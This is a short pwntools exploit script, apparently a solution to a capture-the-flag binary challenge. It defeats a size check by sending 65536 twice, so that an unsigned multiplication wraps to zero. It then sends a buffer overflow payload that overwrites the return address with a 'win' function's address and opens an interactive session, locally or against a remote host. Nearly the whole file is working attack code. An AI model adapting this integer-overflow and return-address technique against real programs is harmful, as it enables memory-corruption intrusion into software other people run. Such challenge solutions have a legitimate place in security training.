from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = find_offset(exe, b"65536\n" + b"65536\n" + cyclic(500))
win = elf.symbols['win']


# This level's challenge is to bypass a integer check for payload size and record size
# The hard check is that the result of multiplication for payload and record size should not exceed a certain number.
# The check that does this uses unsigned integer, so the result of multiplication needs to wrap around to be positive.
# The most reliable way to do this is to make the result 0, by making the product an exact multiple of 2^32
# so the size we use for both is 65536

io = start()

io.sendline(b'65536')
io.sendline(b'65536')

payload = flat([b"A"*offset, win])

io.sendlineafter(b'', payload)
io.recvuntil(b'')
print("OFFSET = ", offset)
io.interactive()
